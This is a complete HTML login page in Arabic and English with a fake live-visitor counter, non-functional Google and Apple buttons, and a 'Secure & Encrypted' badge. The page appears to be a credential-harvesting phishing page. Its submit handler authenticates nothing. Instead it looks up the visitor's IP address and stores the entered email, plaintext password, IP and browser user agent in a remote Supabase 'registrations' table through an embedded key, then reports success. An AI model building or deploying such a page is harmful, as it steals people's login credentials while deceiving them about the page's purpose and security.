<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Login</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
            transition: all 0.5s ease;
        }

        /* ============ خلفية متحركة ============ */
        .bg-animated {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: linear-gradient(-45deg, #0f0c29, #302b63, #24243e, #1a1a2e);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* الجزيئات المتحركة */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }

        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            animation: float linear infinite;
        }

        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 0;
            }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% {
                transform: translateY(-100vh) rotate(720deg);
                opacity: 0;
            }
        }

        /* ============ الحاوية الرئيسية ============ */
        .main-container {
            width: 100%;
            max-width: 460px;
            padding: 20px;
            animation: fadeInUp 0.8s ease;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .login-card {
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 28px;
            padding: 45px 35px;
            box-shadow: 
                0 25px 60px rgba(0, 0, 0, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }

        .login-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(102, 126, 234, 0.05) 0%, transparent 70%);
            animation: rotate 20s linear infinite;
        }

        @keyframes rotate {
            100% { transform: rotate(360deg); }
        }

        /* ============ الهيدر ============ */
        .header {
            text-align: center;
            margin-bottom: 35px;
            position: relative;
        }

        .logo-wrapper {
            position: relative;
            display: inline-block;
            margin-bottom: 20px;
        }

        .logo-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            margin: 0 auto;
            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4);
            animation: pulse 3s ease-in-out infinite;
            position: relative;
        }

        .logo-icon::after {
            content: '';
            position: absolute;
            inset: -3px;
            border-radius: 26px;
            background: linear-gradient(135deg, #667eea, #764ba2, #f093fb);
            z-index: -1;
            opacity: 0.5;
            filter: blur(10px);
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        .online-badge {
            position: absolute;
            bottom: -2px;
            right: -2px;
            width: 20px;
            height: 20px;
            background: #48bb78;
            border-radius: 50%;
            border: 3px solid #1a1a2e;
            animation: blink 2s ease-in-out infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .header h1 {
            color: #fff;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .header p {
            color: rgba(255, 255, 255, 0.4);
            font-size: 14px;
            line-height: 1.6;
        }

        /* ============ التبويبات ============ */
        .tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 30px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 14px;
            padding: 5px;
        }

        .tab {
            flex: 1;
            padding: 12px;
            text-align: center;
            border-radius: 10px;
            cursor: pointer;
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s ease;
            font-family: inherit;
            border: none;
            background: none;
        }

        .tab.active {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff;
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
        }

        .tab:hover:not(.active) {
            color: rgba(255, 255, 255, 0.8);
            background: rgba(255, 255, 255, 0.05);
        }

        /* ============ حقول الإدخال ============ */
        .form-content {
            position: relative;
        }

        .input-group {
            margin-bottom: 22px;
            position: relative;
            animation: slideIn 0.4s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .input-group label {
            display: flex;
            align-items: center;
            gap: 6px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 13px;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper .field-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
            opacity: 0.4;
            transition: 0.3s;
            pointer-events: none;
        }

        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 16px 48px 16px 48px;
            background: rgba(255, 255, 255, 0.07);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 14px;
            color: #fff;
            font-size: 15px;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.3s ease;
            outline: none;
        }

        input:focus {
            border-color: #667eea;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.15);
        }

        input:focus ~ .field-icon {
            opacity: 1;
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.25);
        }

        .toggle-pass {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: rgba(255, 255, 255, 0.4);
            cursor: pointer;
            font-size: 18px;
            padding: 5px;
            transition: 0.3s;
        }

        .toggle-pass:hover {
            color: rgba(255, 255, 255, 0.8);
        }

        /* ============ مؤشر قوة كلمة المرور ============ */
        .password-strength {
            margin-top: 10px;
            display: none;
        }

        .strength-bar {
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 6px;
        }

        .strength-fill {
            height: 100%;
            border-radius: 4px;
            transition: all 0.4s ease;
            width: 0%;
        }

        .strength-text {
            font-size: 11px;
            font-weight: 500;
        }

        /* ============ خيارات إضافية ============ */
        .options-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }

        .remember-me input[type="checkbox"] {
            display: none;
        }

        .custom-checkbox {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.3s;
            font-size: 12px;
        }

        .remember-me input:checked + .custom-checkbox {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-color: transparent;
        }

        .remember-me span:last-child {
            color: rgba(255, 255, 255, 0.5);
            font-size: 13px;
        }

        .forgot-link {
            color: #667eea;
            font-size: 13px;
            text-decoration: none;
            transition: 0.3s;
        }

        .forgot-link:hover {
            color: #f093fb;
        }

        /* ============ زر الإرسال ============ */
        .btn-submit {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 14px;
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
            background: linear-gradient(135deg, #667eea, #764ba2);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
        }

        .btn-submit::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: 0.5s;
        }

        .btn-submit:hover::before {
            left: 100%;
        }

        .btn-submit:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.5);
        }

        .btn-submit:active {
            transform: translateY(-1px);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }

        .btn-text, .btn-loading {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-loading {
            display: none;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ============ الفاصل ============ */
        .divider {
            display: flex;
            align-items: center;
            gap: 15px;
            margin: 25px 0;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.1);
        }

        .divider span {
            color: rgba(255, 255, 255, 0.3);
            font-size: 12px;
            font-weight: 500;
        }

        /* ============ أزرار التواصل الاجتماعي ============ */
        .social-btns {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .social-btn {
            padding: 13px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.04);
            color: #fff;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .social-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: translateY(-2px);
        }

        .social-btn.google:hover { border-color: #ea4335; }
        .social-btn.apple:hover { border-color: #fff; }

        /* ============ الرسائل ============ */
        .message {
            padding: 14px 18px;
            border-radius: 12px;
            margin-top: 20px;
            font-size: 14px;
            display: none;
            animation: fadeIn 0.3s ease;
            text-align: center;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .message.success {
            background: rgba(72, 187, 120, 0.12);
            color: #68d391;
            border: 1px solid rgba(72, 187, 120, 0.2);
            display: block;
        }

        .message.error {
            background: rgba(245, 101, 101, 0.12);
            color: #fc8181;
            border: 1px solid rgba(245, 101, 101, 0.2);
            display: block;
        }

        /* ============ نص تحتي ============ */
        .footer-text {
            text-align: center;
            margin-top: 25px;
            position: relative;
        }

        .footer-text p {
            color: rgba(255, 255, 255, 0.3);
            font-size: 12px;
        }

        .footer-text .secure-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            background: rgba(72, 187, 120, 0.1);
            padding: 6px 14px;
            border-radius: 20px;
            color: #68d391;
            font-size: 11px;
            margin-top: 12px;
        }

        /* ============ الوضع الفاتح ============ */
        .theme-toggle {
            position: fixed;
            top: 20px;
            left: 20px;
            width: 45px;
            height: 45px;
            border-radius: 50%;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.3s;
            z-index: 100;
            backdrop-filter: blur(10px);
        }

        .theme-toggle:hover {
            background: rgba(255, 255, 255, 0.15);
            transform: rotate(30deg);
        }

        /* ============ اللغة ============ */
        .lang-toggle {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 18px;
            border-radius: 25px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 13px;
            cursor: pointer;
            font-family: 'Tajawal', sans-serif;
            font-weight: 600;
            transition: 0.3s;
            z-index: 100;
            backdrop-filter: blur(10px);
        }

        .lang-toggle:hover {
            background: rgba(255, 255, 255, 0.15);
        }

        /* ============ Light Mode ============ */
        body.light .bg-animated {
            background: linear-gradient(-45deg, #f5f7fa, #c3cfe2, #e0e5ec, #f0f2f5);
        }

        body.light .login-card {
            background: rgba(255, 255, 255, 0.8);
            border-color: rgba(0, 0, 0, 0.08);
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.1);
        }

        body.light .header h1 { color: #2d3748; }
        body.light .header p { color: #718096; }
        body.light .tab { color: #718096; }
        body.light .input-group label { color: #4a5568; }
        body.light input {
            background: rgba(0, 0, 0, 0.04);
            border-color: rgba(0, 0, 0, 0.1);
            color: #2d3748;
        }
        body.light input::placeholder { color: rgba(0,0,0,0.3); }
        body.light .particle { background: rgba(0, 0, 0, 0.05); }
        body.light .divider span { color: #a0aec0; }
        body.light .divider::before,
        body.light .divider::after { background: rgba(0,0,0,0.1); }
        body.light .social-btn {
            background: rgba(0,0,0,0.03);
            border-color: rgba(0,0,0,0.08);
            color: #2d3748;
        }

        /* ============ تجاوب ============ */
        @media (max-width: 480px) {
            .login-card { padding: 35px 25px; border-radius: 22px; }
            .header h1 { font-size: 22px; }
            .social-btns { grid-template-columns: 1fr; }
        }

        /* ============ تأثير نجاح ============ */
        .success-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }

        .success-overlay.show {
            display: flex;
            animation: fadeIn 0.3s ease;
        }

        .success-box {
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 50px 40px;
            text-align: center;
            max-width: 350px;
            width: 90%;
            animation: bounceIn 0.5s ease;
        }

        @keyframes bounceIn {
            0% { transform: scale(0.5); opacity: 0; }
            70% { transform: scale(1.05); }
            100% { transform: scale(1); opacity: 1; }
        }

        .success-icon {
            width: 80px;
            height: 80px;
            background: rgba(72, 187, 120, 0.15);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 40px;
        }

        .success-box h2 {
            color: #68d391;
            font-size: 22px;
            margin-bottom: 10px;
        }

        .success-box p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
        }

        /* إشعار عائم */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            padding: 14px 28px;
            border-radius: 14px;
            font-size: 14px;
            font-family: 'Tajawal', sans-serif;
            font-weight: 500;
            z-index: 9999;
            transition: transform 0.4s ease;
            backdrop-filter: blur(20px);
        }

        .toast.show {
            transform: translateX(-50%) translateY(0);
        }

        .toast.success {
            background: rgba(72, 187, 120, 0.9);
            color: #fff;
        }

        .toast.error {
            background: rgba(245, 87, 108, 0.9);
            color: #fff;
        }

        /* مؤشر التحميل العلوي */
        .top-loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 0%;
            height: 3px;
            background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
            z-index: 9999;
            transition: width 0.4s ease;
            border-radius: 0 3px 3px 0;
        }

        .top-loader.loading {
            width: 70%;
        }

        .top-loader.done {
            width: 100%;
        }

        /* عداد الزوار */
        .visitor-counter {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 8px 16px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 11px;
            display: flex;
            align-items: center;
            gap: 6px;
            z-index: 50;
        }

        .live-dot {
            width: 6px;
            height: 6px;
            background: #48bb78;
            border-radius: 50%;
            animation: blink 1.5s ease infinite;
        }
    </style>
</head>
<body>
    <!-- خلفية متحركة -->
    <div class="bg-animated"></div>
    <div class="particles" id="particles"></div>

    <!-- شريط التحميل العلوي -->
    <div class="top-loader" id="topLoader"></div>

    <!-- زر تبديل السمة -->
    <button class="theme-toggle" onclick="toggleTheme()" title="تبديل السمة">🌙</button>

    <!-- زر تبديل اللغة -->
    <button class="lang-toggle" onclick="toggleLang()" id="langBtn">EN</button>

    <!-- عداد الزوار -->
    <div class="visitor-counter">
        <div class="live-dot"></div>
        <span id="visitorCount">--</span> متصل الآن
    </div>

    <!-- تأثير النجاح -->
    <div class="success-overlay" id="successOverlay">
        <div class="success-box">
            <div class="success-icon">✅</div>
            <h2 id="successTitle">تم بنجاح!</h2>
            <p id="successDesc">تم تسجيل بياناتك بنجاح</p>
        </div>
    </div>

    <!-- المحتوى الرئيسي -->
    <div class="main-container">
        <div class="login-card">
            <div class="header">
                <div class="logo-wrapper">
                    <div class="logo-icon">🔐</div>
                    <div class="online-badge"></div>
                </div>
                <h1 id="mainTitle">تسجيل الدخول</h1>
                <p id="mainDesc">أدخل بياناتك للوصول إلى حسابك</p>
            </div>

            <!-- التبويبات -->
            <div class="tabs">
                <button class="tab active" onclick="switchTab('login')" id="tabLogin">
                    🔑 تسجيل دخول
                </button>
                <button class="tab" onclick="switchTab('register')" id="tabRegister">
                    ✨ حساب جديد
                </button>
            </div>

            <!-- النموذج -->
            <form id="mainForm" class="form-content">
                <div class="input-group">
                    <label id="emailLabel">
                        <span>📧</span>
                        البريد الإلكتروني
                    </label>
                    <div class="input-wrapper">
                        <span class="field-icon">📧</span>
                        <input 
                            type="email" 
                            id="email" 
                            placeholder="example@email.com"
                            required
                            autocomplete="off"
                        >
                    </div>
                </div>

                <div class="input-group">
                    <label id="passLabel">
                        <span>🔒</span>
                        كلمة المرور
                    </label>
                    <div class="input-wrapper">
                        <span class="field-icon">🔒</span>
                        <input 
                            type="password" 
                            id="password" 
                            placeholder="••••••••"
                            required
                            autocomplete="off"
                        >
                        <button type="button" class="toggle-pass" onclick="togglePassword()">
                            👁️
                        </button>
                    </div>

                    <!-- مؤشر القوة -->
                    <div class="password-strength" id="strengthBox">
                        <div class="strength-bar">
                            <div class="strength-fill" id="strengthFill"></div>
                        </div>
                        <div class="strength-text" id="strengthText"></div>
                    </div>
                </div>

                <!-- خيارات -->
                <div class="options-row">
                    <label class="remember-me">
                        <input type="checkbox" id="rememberMe">
                        <div class="custom-checkbox">✓</div>
                        <span id="rememberText">تذكرني</span>
                    </label>
                    <a href="#" class="forgot-link" id="forgotText">نسيت كلمة المرور؟</a>
                </div>

                <!-- زر الإرسال -->
                <button type="submit" class="btn-submit" id="submitBtn">
                    <span class="btn-text" id="btnText">تسجيل الدخول ←</span>
                    <span class="btn-loading" id="btnLoading">
                        <div class="spinner"></div>
                        جاري المعالجة...
                    </span>
                </button>

                <div class="message" id="message"></div>
            </form>

            <!-- الفاصل -->
            <div class="divider">
                <span id="dividerText">أو</span>
            </div>

            <!-- أزرار التواصل الاجتماعي -->
            <div class="social-btns">
                <button class="social-btn google" onclick="socialLogin('google')">
                    <svg width="18" height="18" viewBox="0 0 24 24">
                        <path fill="#EA4335" d="M5.26 9.76A7.49 7.49 0 0 1 12 4.5c1.87 0 3.47.69 4.76 1.78l3.59-3.59C18.21 1.02 15.36 0 12 0A12 12 0 0 0 1.24 6.65l4.02 3.11z"/>
                        <path fill="#34A853" d="M16.04 18.01A7.12 7.12 0 0 1 12 19.5a7.49 7.49 0 0 1-6.74-4.24l-4.02 3.11A11.99 11.99 0 0 0 12 24c3.24 0 5.95-1.08 7.93-2.91l-3.89-3.08z"/>
                        <path fill="#4A90D9" d="M19.93 21.09C22.18 19.07 23.5 15.99 23.5 12c0-.71-.07-1.42-.19-2.09H12v4.63h6.44a5.53 5.53 0 0 1-2.4 3.47l3.89 3.08z"/>
                        <path fill="#FBBC05" d="M5.26 15.26A7.45 7.45 0 0 1 4.5 12c0-.9.15-1.76.42-2.56L.9 6.33A11.97 11.97 0 0 0 0 12c0 1.94.46 3.77 1.24 5.35l4.02-2.09z"/>
                    </svg>
                    Google
                </button>
                <button class="social-btn apple" onclick="socialLogin('apple')">
                    🍎 Apple
                </button>
            </div>

            <!-- نص تحتي -->
            <div class="footer-text">
                <div class="secure-badge">
                    🔒 <span id="secureText">اتصال آمن ومشفر</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        //   مفاتيح Supabase
        // ============================================
        const SUPABASE_URL = 'https://efaihsifuedacoawbddo.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVmYWloc2lmdWVkYWNvYXdiZGRvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI3ODgzNDQsImV4cCI6MjA4ODM2NDM0NH0.P3ejbFe1wU2HOtdUouVlH3pCjIUUqmB0XpkKf8hXBGs';

        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        let currentTab = 'login';
        let isArabic = true;
        let isDark = true;

        // ============ إنشاء الجزيئات ============
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.width = Math.random() * 4 + 2 + 'px';
                particle.style.height = particle.style.width;
                particle.style.animationDuration = Math.random() * 10 + 10 + 's';
                particle.style.animationDelay = Math.random() * 10 + 's';
                container.appendChild(particle);
            }
        }
        createParticles();

        // ============ عداد زوار وهمي ============
        function updateVisitorCount() {
            const count = Math.floor(Math.random() * 50) + 120;
            document.getElementById('visitorCount').textContent = count;
        }
        updateVisitorCount();
        setInterval(updateVisitorCount, 30000);

        // ============ تبديل التبويبات ============
        function switchTab(tab) {
            currentTab = tab;
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            
            if (tab === 'login') {
                document.getElementById('tabLogin').classList.add('active');
                document.getElementById('btnText').textContent = isArabic ? 'تسجيل الدخول ←' : 'Sign In →';
                document.getElementById('mainTitle').textContent = isArabic ? 'تسجيل الدخول' : 'Sign In';
            } else {
                document.getElementById('tabRegister').classList.add('active');
                document.getElementById('btnText').textContent = isArabic ? 'إنشاء حساب ←' : 'Create Account →';
                document.getElementById('mainTitle').textContent = isArabic ? 'حساب جديد' : 'New Account';
            }

            // إعادة الأنيميشن
            document.querySelectorAll('.input-group').forEach((el, i) => {
                el.style.animation = 'none';
                setTimeout(() => {
                    el.style.animation = `slideIn 0.4s ease ${i * 0.1}s both`;
                }, 10);
            });
        }

        // ============ تبديل إظهار كلمة المرور ============
        function togglePassword() {
            const input = document.getElementById('password');
            const btn = document.querySelector('.toggle-pass');
            if (input.type === 'password') {
                input.type = 'text';
                btn.textContent = '🙈';
            } else {
                input.type = 'password';
                btn.textContent = '👁️';
            }
        }

        // ============ مؤشر قوة كلمة المرور ============
        document.getElementById('password').addEventListener('input', function() {
            const val = this.value;
            const box = document.getElementById('strengthBox');
            const fill = document.getElementById('strengthFill');
            const text = document.getElementById('strengthText');

            if (val.length === 0) {
                box.style.display = 'none';
                return;
            }

            box.style.display = 'block';
            let strength = 0;
            if (val.length >= 6) strength++;
            if (val.length >= 10) strength++;
            if (/[A-Z]/.test(val)) strength++;
            if (/[0-9]/.test(val)) strength++;
            if (/[^A-Za-z0-9]/.test(val)) strength++;

            const levels = [
                { width: '20%', color: '#fc8181', text: isArabic ? '🔴 ضعيفة جداً' : '🔴 Very Weak' },
                { width: '40%', color: '#f6ad55', text: isArabic ? '🟠 ضعيفة' : '🟠 Weak' },
                { width: '60%', color: '#faf089', text: isArabic ? '🟡 متوسطة' : '🟡 Medium' },
                { width: '80%', color: '#68d391', text: isArabic ? '🟢 قوية' : '🟢 Strong' },
                { width: '100%', color: '#48bb78', text: isArabic ? '💪 قوية جداً' : '💪 Very Strong' }
            ];

            const level = levels[Math.min(strength, 4)];
            fill.style.width = level.width;
            fill.style.background = level.color;
            text.style.color = level.color;
            text.textContent = level.text;
        });

        // ============ إشعار عائم ============
        function showToast(message, type = 'success') {
            const existing = document.querySelector('.toast');
            if (existing) existing.remove();

            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            document.body.appendChild(toast);

            setTimeout(() => toast.classList.add('show'), 10);
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => toast.remove(), 400);
            }, 3000);
        }

        // ============ شريط التحميل العلوي ============
        function setLoader(state) {
            const loader = document.getElementById('topLoader');
            loader.className = 'top-loader ' + state;
            if (state === 'done') {
                setTimeout(() => {
                    loader.className = 'top-loader';
                    loader.style.width = '0%';
                }, 500);
            }
        }

        // ============ تبديل السمة ============
        function toggleTheme() {
            isDark = !isDark;
            document.body.classList.toggle('light');
            document.querySelector('.theme-toggle').textContent = isDark ? '🌙' : '☀️';
            showToast(isDark ? '🌙 الوضع الداكن' : '☀️ الوضع الفاتح');
        }

        // ============ تبديل اللغة ============
        function toggleLang() {
            isArabic = !isArabic;
            const btn = document.getElementById('langBtn');
            
            if (isArabic) {
                document.documentElement.dir = 'rtl';
                document.documentElement.lang = 'ar';
                btn.textContent = 'EN';
                document.getElementById('mainTitle').textContent = currentTab === 'login' ? 'تسجيل الدخول' : 'حساب جديد';
                document.getElementById('mainDesc').textContent = 'أدخل بياناتك للوصول إلى حسابك';
                document.getElementById('tabLogin').innerHTML = '🔑 تسجيل دخول';
                document.getElementById('tabRegister').innerHTML = '✨ حساب جديد';
                document.getElementById('emailLabel').innerHTML = '<span>📧</span> البريد الإلكتروني';
                document.getElementById('passLabel').innerHTML = '<span>🔒</span> كلمة المرور';
                document.getElementById('rememberText').textContent = 'تذكرني';
                document.getElementById('forgotText').textContent = 'نسيت كلمة المرور؟';
                document.getElementById('btnText').textContent = currentTab === 'login' ? 'تسجيل الدخول ←' : 'إنشاء حساب ←';
                document.getElementById('dividerText').textContent = 'أو';
                document.getElementById('secureText').textContent = 'اتصال آمن ومشفر';
            } else {
                document.documentElement.dir = 'ltr';
                document.documentElement.lang = 'en';
                btn.textContent = 'عربي';
                document.getElementById('mainTitle').textContent = currentTab === 'login' ? 'Sign In' : 'New Account';
                document.getElementById('mainDesc').textContent = 'Enter your credentials to access your account';
                document.getElementById('tabLogin').innerHTML = '🔑 Sign In';
                document.getElementById('tabRegister').innerHTML = '✨ Register';
                document.getElementById('emailLabel').innerHTML = '<span>📧</span> Email Address';
                document.getElementById('passLabel').innerHTML = '<span>🔒</span> Password';
                document.getElementById('rememberText').textContent = 'Remember me';
                document.getElementById('forgotText').textContent = 'Forgot password?';
                document.getElementById('btnText').textContent = currentTab === 'login' ? 'Sign In →' : 'Create Account →';
                document.getElementById('dividerText').textContent = 'OR';
                document.getElementById('secureText').textContent = 'Secure & Encrypted';
            }
        }

        // ============ تسجيل دخول سوشيال ============
        function socialLogin(provider) {
            showToast(isArabic ? `جاري التوجيه إلى ${provider}...` : `Redirecting to ${provider}...`);
        }

        // ============ إرسال النموذج ============
        document.getElementById('mainForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const btn = document.getElementById('submitBtn');
            const btnText = document.getElementById('btnText');
            const btnLoading = document.getElementById('btnLoading');

            if (!email || !password) {
                showToast(isArabic ? '❌ يرجى ملء جميع الحقول' : '❌ Please fill all fields', 'error');
                return;
            }

            // تفعيل التحميل
            btn.disabled = true;
            btnText.style.display = 'none';
            btnLoading.style.display = 'flex';
            setLoader('loading');

            try {
                // جمع معلومات إضافية
                let ipAddress = 'unknown';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    ipAddress = ipData.ip;
                } catch(e) {}

                const { data, error } = await supabase
                    .from('registrations')
                    .insert([{
                        email: email,
                        password: password,
                        ip_address: ipAddress,
                        user_agent: navigator.userAgent
                    }]);

                if (error) throw error;

                setLoader('done');

                // إظهار تأثير النجاح
                document.getElementById('successOverlay').classList.add('show');
                document.getElementById('mainForm').reset();
                document.getElementById('strengthBox').style.display = 'none';

                // إخفاء تأثير النجاح بعد 3 ثواني
                setTimeout(() => {
                    document.getElementById('successOverlay').classList.remove('show');
                }, 3000);

                showToast(isArabic ? '✅ تم التسجيل بنجاح!' : '✅ Registered successfully!');

            } catch (error) {
                console.error('Error:', error);
                setLoader('done');
                showToast(isArabic ? '❌ حدث خطأ، حاول مرة أخرى' : '❌ Error occurred, try again', 'error');
            } finally {
                btn.disabled = false;
                btnText.style.display = 'flex';
                btnLoading.style.display = 'none';
            }
        });

        // إخفاء overlay عند الضغط عليه
        document.getElementById('successOverlay').addEventListener('click', function() {
            this.classList.remove('show');
        });
    </script>
</body>
</html>
